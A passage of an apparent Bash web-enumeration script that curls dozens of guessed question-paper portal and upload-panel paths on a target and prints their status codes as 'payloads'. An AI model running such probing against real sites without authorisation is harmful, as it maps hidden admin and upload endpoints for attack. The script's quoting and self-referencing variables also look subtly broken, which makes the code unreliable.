         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperBatchUpload/"]: "
